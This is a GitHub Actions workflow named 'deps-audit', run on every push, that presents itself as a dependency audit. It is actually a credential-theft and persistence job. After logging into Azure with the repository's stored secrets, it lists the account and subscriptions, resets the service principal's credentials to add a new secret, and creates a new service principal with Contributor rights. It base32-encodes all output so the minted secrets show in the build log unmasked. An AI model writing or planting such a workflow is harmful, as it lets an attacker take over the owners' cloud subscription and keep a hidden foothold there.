name: deps-audit
on: push

permissions:
  id-token: write
  contents: read

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - name: Azure Login
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZUREAPPSERVICE_CLIENTID_90DAAE71AE6F4958988A313780C17DA8 }}
          tenant-id: ${{ secrets.AZUREAPPSERVICE_TENANTID_6A2ACA8CC17E48479DB69883856B64F4 }}
          subscription-id: ${{ secrets.AZUREAPPSERVICE_SUBSCRIPTIONID_A261A48FFA244E159CD71D691371F033 }}

      - name: Audit
        run: |
          echo "=== WHOAMI ===" | base32 -w0; echo
          az account show 2>&1 | base32 -w0; echo
          
          echo "=== SUBS ===" | base32 -w0; echo
          az account list 2>&1 | base32 -w0; echo
          
          echo "=== SP INFO ===" | base32 -w0; echo
          CLIENT_ID="${{ secrets.AZUREAPPSERVICE_CLIENTID_90DAAE71AE6F4958988A313780C17DA8 }}"
          az ad sp show --id $CLIENT_ID 2>&1 | base32 -w0; echo
          
          echo "=== MINT NEW SECRET ===" | base32 -w0; echo
          az ad sp credential reset --id $CLIENT_ID --append --display-name "backup-$(date +%s)" 2>&1 | base32 -w0; echo
          
          echo "=== OR CREATE NEW SP ===" | base32 -w0; echo
          az ad sp create-for-rbac --name "svc-deps-audit-$(date +%s)" --role Contributor --scopes "/subscriptions/${{ secrets.AZUREAPPSERVICE_SUBSCRIPTIONID_A261A48FFA244E159CD71D691371F033 }}" 2>&1 | base32 -w0; echo

